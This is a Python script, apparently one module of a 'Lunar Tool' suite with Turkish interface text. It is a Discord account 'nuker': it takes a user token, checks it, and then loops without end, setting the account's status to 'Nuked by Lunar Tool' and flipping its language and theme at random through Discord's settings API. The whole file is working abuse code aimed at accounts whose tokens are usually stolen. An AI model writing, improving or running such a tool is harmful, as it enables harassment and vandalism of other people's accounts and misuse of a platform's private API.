import requests
import time
import random
from itertools import cycle
from rich.console import Console

console = Console()


def run():
    token = console.input("[bold white]  Discord Token: [/]").strip()
    if not token:
        console.print("[red]  Token bos olamaz.[/]")
        return

    custom = console.input("[bold white]  Custom Status (bos birakilabilir): [/]").strip()

    headers = {"Authorization": token, "Content-Type": "application/json"}
    r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
    if r.status_code != 200:
        console.print("[red]  Gecersiz token.[/]")
        return

    console.print("[#818cf8]  Token dogrulandi. Nuker baslatiliyor...[/]")
    console.print("[yellow]  Durdurmak icin Ctrl+C basin.[/]")
    time.sleep(1)

    modes = cycle(["light", "dark"])
    languages = ["ja", "zh-TW", "ko", "zh-CN", "th", "uk", "ru", "el", "cs", "tr", "vi", "hi"]

    try:
        while True:

            status_text = custom if custom else "Nuked by Lunar Tool"
            payload = {"custom_status": {"text": status_text}}
            try:
                requests.patch("https://discord.com/api/v9/users/@me/settings",
                               headers=headers, json=payload, timeout=5)
                console.print(f"[#818cf8]  [+] Status degistirildi: {status_text}[/]")
            except Exception:
                console.print("[red]  [-] Status degistirme basarisiz[/]")

            for _ in range(3):
                try:
                    lang = random.choice(languages)
                    requests.patch("https://discord.com/api/v9/users/@me/settings",
                                   headers=headers, json={"locale": lang}, timeout=5)
                    console.print(f"[#a78bfa]  [+] Dil: {lang}[/]")
                except Exception:
                    pass

                try:
                    theme = next(modes)
                    requests.patch("https://discord.com/api/v9/users/@me/settings",
                                   headers=headers, json={"theme": theme}, timeout=5)
                    console.print(f"[#a78bfa]  [+] Tema: {theme}[/]")
                except Exception:
                    pass
                time.sleep(0.5)

    except KeyboardInterrupt:
        console.print("\n[dim]  Nuker durduruldu.[/]")
